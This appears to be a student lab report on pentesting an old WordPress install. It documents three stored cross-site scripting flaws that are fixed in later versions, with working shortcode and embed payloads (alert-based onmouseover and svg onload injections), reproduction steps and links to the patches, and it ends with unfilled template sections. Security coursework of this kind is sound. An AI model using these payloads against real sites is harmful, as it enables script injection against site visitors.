# Project 7 - WordPress Pentesting

Time spent: **5** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Authenticated Stored Cross-Site Scripting (XSS)
  - [ ] Summary: Cross-site scripting (XSS) vulnerability in WordPress before 4.2.3 allows remote authenticated users to inject arbitrary web script or HTML by leveraging the Author or Contributor role to place a crafted shortcode inside an HTML element, related to wp-includes/kses.php and wp-includes/shortcodes.php. 
    - Vulnerability types:XSS
    - Tested in version:4.2.2 and earlier
    - Fixed in version: 4.2.3
  - [ ] GIF Walkthrough: ![](https://github.com/LizDao/Week7CodePath/blob/master/GIF_Walkthrough/XXS_A_Tag.gif)
  - [ ] Steps to recreate:
     First, you need to gain posting permission to the website (maybe through another exploit)
     Then the following code should be entered in a page or posting using the HTML edit mode:
      ```
      <a href="[caption code=">]</a><a title=" onmouseover=alert('XSS!')  ">text</a>
      ```
      WordPress shortcode processing manipulates this into the following form:
      ```
      <a href="</a><a title=" onmouseover=alert('XSS!')  ">text</a>
      ```
       A real-world exploit could use a style attribute to create a transparent tag covering the whole browser window to force execution of      the onmouseover code. 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/changeset/33359)
2. (Required) Authenticated Shortcode Tags Cross-Site Scripting (XSS)
  - [ ] Summary:  Cross-site scripting (XSS) vulnerability in WordPress before 4.3.1 allows remote attackers to inject arbitrary web script or HTML by leveraging the mishandling of unclosed HTML elements during processing of shortcode tags. 
    - Vulnerability types: XSS
    - Tested in version: 4.3 and earlier
    - Fixed in version: 4.3.1
  - [ ] GIF Walkthrough: ![](https://github.com/LizDao/Week7CodePath/blob/master/GIF_Walkthrough/XXS_A_Tag_2.gif)
  - [ ] Steps to recreate: 
    This is quite similar to the first exploit. You need to gain post level permission and then post the following code 
    to the website:
    ```
    [caption width="1" caption='<a href="' ">]</a><a href=" onmouseover='alert("XSS!")' ">Text</a>
    ```
    Which will be processed to be:
    ```
    <figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href=" onmouseover='alert("XSS!")' ">Text</a>
    ```
    - [ ] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8)
    -[Link 2](https://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/)
1. (Required) Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [ ] Summary: In WordPress before 4.7.3 (wp-includes/embed.php), there is authenticated Cross-Site Scripting (XSS) in YouTube URL Embeds. 
    - Vulnerability types: XSS
    - Tested in version:4.7.2
    - Fixed in version: 4.7.3
  - [ ] GIF Walkthrough: ![](https://github.com/LizDao/Week7CodePath/blob/master/GIF_Walkthrough/XSS_Embedded_Linke.gif)
  - [ ] Steps to recreate: 
    Similarly to the 2 exploits above, you gain post level permission and post the embedded url to the website:
    ```
    [embed src='https://www.youtube.com/embed/12345\x3csvg onload=alert("XSS!")\x3e'][/embed]
    ```
    Wordpress will then process this code into:
    ```
    <p>https://youtube.com/watch?v=12345<svg onload=alert("XSS!")></p>
    ```
    - [ ] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8)
1. (Optional)  Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [ ] Summary: In WordPress before 4.7.3 (wp-includes/embed.php), there is authenticated Cross-Site Scripting (XSS) in YouTube URL Embeds. 
    - Vulnerability types: XSS
    - Tested in version:4.7.2
    - Fixed in version: 4.7.3
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
